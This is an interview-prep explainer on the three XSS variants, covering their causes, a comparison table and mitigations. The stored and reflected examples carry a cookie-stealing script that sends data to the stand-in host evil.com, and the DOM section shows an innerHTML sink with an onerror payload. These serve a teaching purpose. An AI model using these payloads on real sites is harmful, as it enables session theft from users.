# XSS: Stored, Reflected, and DOM-Based — Precise Distinctions

Cross-Site Scripting (XSS) is any vulnerability that lets an attacker get their JavaScript to execute in the context of your origin, in another user's browser. All three variants share that end result, but they differ in **where the malicious payload is stored and how it reaches the victim's browser** — and that distinction is exactly what interviewers probe, because the mitigation differs by variant.

## The common root cause

XSS happens when untrusted input is inserted into a page in a way the browser interprets as **executable code or markup** rather than **inert text**. The browser has no way to distinguish "the developer wrote this HTML/script" from "a user's input happened to contain HTML/script" unless the application explicitly encodes/escapes that input before it reaches a sink (an HTML-rendering location, `innerHTML`, `eval`, an attribute, a URL, etc.).

## 1. Stored (Persistent) XSS

The malicious payload is **saved server-side** (a database, a file, a comment field) and served back to *any* user who views the affected page — no special link or interaction is required from the victim beyond visiting a normal page.

**Example:** A comment form doesn't sanitize input. An attacker posts a comment containing `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`. Every subsequent visitor who views that comment thread has the script execute in their browser, in your site's origin — meaning it can read `document.cookie` (for non-`HttpOnly` cookies), make authenticated requests, or manipulate the DOM.

**Why it's the most dangerous variant:** it's persistent and passive from the attacker's side — no need to trick a specific victim into clicking anything; every viewer of the page is a victim automatically.

## 2. Reflected (Non-Persistent) XSS

The payload is **not stored** — it's part of the request itself (typically a URL query parameter or form submission) and the server "reflects" it back into the response HTML unescaped. It requires the victim to click a **crafted link** (or submit a crafted form) that the attacker constructs and distributes (phishing email, malicious ad, etc.).

**Example:** A search page renders `<p>You searched for: {query}</p>` directly from `?q=...` without escaping. An attacker sends a victim a link:
```
https://example.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```
When the victim clicks it, the server reflects that query string straight into the HTML response, and the script executes in the victim's browser under `example.com`'s origin.

**Key distinguishing fact:** the payload lives in the URL/request, not the database — so it's per-victim and requires social engineering to deliver the link, unlike stored XSS which is automatically served to everyone.

## 3. DOM-Based XSS

The vulnerability is **entirely client-side** — the payload never has to round-trip through the server at all (though it still might arrive via a URL). Malicious data flows from a **source** (something attacker-controllable, e.g. `location.hash`, `location.search`, `document.referrer`, `window.name`) to a **sink** (a DOM API that interprets its input as HTML/JS, e.g. `innerHTML`, `document.write`, `eval`, `setTimeout(string)`, `element.setAttribute('href', ...)` with a `javascript:` URL) entirely within client-side JavaScript, with no server involvement in the injection itself.

**Example:**
```js
// Vulnerable: reads directly from the URL fragment and injects into innerHTML
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${name}!`;
```
```
https://example.com/page?name=<img src=x onerror=alert(document.cookie)>
```
The server never even sees this payload interpreted as HTML — it might serve a completely static page — but client-side JS takes an attacker-controlled source (`location.search`) and pipes it into a sink (`innerHTML`) that executes it. This is why server-side output encoding alone does **not** protect against DOM-based XSS: the server was never the one rendering the dangerous value.

## Comparison table

| Variant | Payload storage | Delivery mechanism | Requires server bug? | Requires victim interaction? |
|---|---|---|---|---|
| **Stored** | Server-side (DB, file) | Normal page view | Yes — server fails to sanitize on save or render | No — passive, hits every viewer |
| **Reflected** | Request (URL/form params) | Crafted link/form the attacker sends victim | Yes — server reflects request data into response unescaped | Yes — victim must click the crafted link |
| **DOM-based** | Anywhere (often URL fragment/query) | Crafted link, or any attacker-influenced client-side data source | No — can be a pure client-side JS bug even with a perfectly safe server | Usually yes — victim opens the crafted URL |

## Mitigations, matched to the mechanism

- **Output encoding/escaping at the point of insertion** — HTML-entity-encode any untrusted data inserted into HTML, URL-encode it in URLs, JS-string-encode it in inline scripts. This is the primary defense for stored and reflected XSS (server-rendered contexts) and applies equally to DOM-based sinks.
- **Never use `innerHTML`/`dangerouslySetInnerHTML`/`eval`/`document.write` with unsanitized input.** Prefer `textContent`, framework-managed rendering (React JSX auto-escapes text content by default), or a vetted sanitizer library (DOMPurify) when HTML rendering is genuinely required (e.g. a rich-text editor's output).
- **Content Security Policy (CSP)** — a defense-in-depth layer that can prevent injected `<script>` tags from executing even if an XSS injection point exists, by restricting which script sources/inline scripts are allowed to run (see the CSP theory file).
- **`HttpOnly` cookies** — doesn't prevent XSS, but limits the damage: a script running via XSS can't read a cookie flagged `HttpOnly` via `document.cookie`, so session-hijacking-via-cookie-theft is mitigated even if an XSS hole exists (see the cookie-flags theory file).
- **Framework defaults matter, but aren't a complete shield.** React/Vue/Angular auto-escape text interpolation by default, which closes off the most common injection point — but any explicit "raw HTML" escape hatch (`dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`) reopens the exact same class of vulnerability if fed unsanitized input.

## Interview framing

*"The three variants differ in where the payload lives and how it reaches the victim — stored persists server-side and hits every viewer passively, reflected rides along in a crafted request and needs the victim to click a link, and DOM-based never needs the server to mishandle anything because the source-to-sink flow happens entirely in client-side JS. The shared root cause across all three is untrusted data reaching an execution context — HTML, a script, an attribute, a URL — without being encoded for that context, so the fix is always encode-at-the-sink, with CSP as a defense-in-depth backstop."*
